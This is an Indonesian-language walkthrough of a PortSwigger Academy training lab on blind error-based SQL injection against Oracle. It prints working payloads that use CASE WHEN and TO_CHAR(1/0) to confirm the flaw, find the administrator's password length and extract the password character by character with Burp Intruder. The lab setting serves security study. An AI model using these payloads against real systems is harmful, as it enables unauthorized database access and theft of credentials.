# [PortSwigger Academy] SQL Injection - Lab #12

## 📌 Detail Lab
* **Nama Tantangan:** Blind SQL injection with conditional errors
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** SQL Injection (SQLi) - Blind Error-Based
* **Tujuan Lab:** Mengekstrak password milik user `administrator` dari tabel `users` dengan memanfaatkan respons error kondisional dari database Oracle, lalu login ke sistem.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Aplikasi memproses parameter cookie `TrackingId` di dalam kueri database. Respons visual halaman web selalu sama baik kueri menghasilkan data atau tidak. Namun, jika terjadi kesalahan sintaksis atau error logika pada database, aplikasi akan merespons dengan status **HTTP 500 Internal Server Error**.

Dengan memanfaatkan karakteristik database **Oracle**, kita bisa menyusun struktur logika kondisional menggunakan blok perintah `CASE WHEN`. Jika kondisi yang kita inginkan terpenuhi (TRUE), kita akan memaksa database mengeksekusi perintah ilegal (seperti `TO_CHAR(1/0)`) yang akan memicu error 500. Jika salah (FALSE), database mengeksekusi perintah normal.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Memverifikasi Celah Conditional Error (Oracle)
Uji parameter `TrackingId` pada Burp Repeater untuk memastikan database merespons evaluasi logika kita:

* **Kondisi FALSE Terencana:**
  `TrackingId=HDFUBphEQh1urDgk' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '`
  * **Respons:** *HTTP 200 OK* (Karena 1=2 salah, database mengeksekusi `ELSE NULL` yang aman).
* **Kondisi TRUE Terencana:**
  `TrackingId=HDFUBphEQh1urDgk' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '`
  * **Respons:** *HTTP 500 Internal Server Error* (Karena 1=1 benar, database dipaksa mengeksekusi `1/0` sehingga memicu error pembagian dengan nol).

Ini membuktikan parameter rentan terhadap *Error-Based Blind SQLi*.

### Memverifikasi Keberadaan User 'administrator'
Pastikan target user ada di dalam database:
* **Payload:** `TrackingId=HDFUBphEQh1urDgk' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '`
* **Respons:** *HTTP 500 Internal Server Error* (Mengonfirmasi bahwa baris user `administrator` ditemukan).

### Menentukan Panjang Password
Gunakan fungsi `LENGTH()` untuk mencari tahu panjang karakter password:
* **Payload:** `TrackingId=HDFUBphEQh1urDgk' || (SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '`
* **Respons:** *HTTP 500 Internal Server Error* pada angka **20**. Ini membuktikan panjang password adalah **20 karakter**.

### Menguras Password Karakter demi Karakter (Data Brute-Forcing)
Gunakan fungsi `SUBSTR()` untuk menguji setiap posisi karakter satu per satu. Kirim request ke **Burp Intruder** dengan tipe serangan *Cluster Bomb*:

* **Payload Inti:** `TrackingId=HDFUBphEQh1urDgk' || (SELECT CASE WHEN (SUBSTR(password,§1§,1)='§a§') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '`

#### Cara Membaca Hasil di Burp Intruder:
* Jika tebakan karakter **SALAH**, aplikasi mengembalikan status **HTTP 200 OK**.
* Jika tebakan karakter **BENAR**, aplikasi mengembalikan status **HTTP 500 Internal Server Error**.

Lakukan otomatisasi ini untuk posisi karakter 1 sampai 20 terhadap seluruh karakter alfanumerik. Kumpulkan karakter yang memicu status 500 hingga membentuk string password utuh:
```
y9ghw991smacq6iwsyc8
```

### Hasil Eksploitasi
**Hasil Akhir:** Buka fitur login aplikasi web target, masukkan username `administrator` beserta string password 20 karakter yang berhasil diekstrak melalui metode berbasis error ini. Login sukses dan lab dinyatakan *Solved*.